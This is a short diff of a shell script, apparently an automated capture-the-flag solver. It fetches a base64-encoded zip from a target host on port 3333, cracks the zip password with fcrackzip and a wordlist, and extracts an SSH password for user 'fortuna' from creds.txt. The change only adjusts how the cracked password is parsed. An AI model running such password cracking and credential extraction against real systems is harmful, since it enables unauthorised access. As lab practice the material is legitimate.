@@ -33,9 +33,9 @@ rm -rf file.zip 2>/dev/null
 
 wget -qO - "$IP:3333" | base64 -d > file.zip
 
-PASSWORD=$(fcrackzip -v -u -D -p "$Wordlist" file.zip | grep -o 'PASSWORD FOUND!!!!   pw ==  ".*"' | cut -d '"' -f 2)
+PASSWORD=$(fcrackzip -v -u -D -p "$Wordlist" file.zip | grep -o '== [a-zA-Z0-9]*$' | awk '{print $2}')
 
-unzip -P $PASSWORD file.zip 
+unzip -P "$PASSWORD" file.zip 
 
 ssh_pass=$(cat creds.txt | grep 'fortuna:' | cut -d ':' -f 2)
 
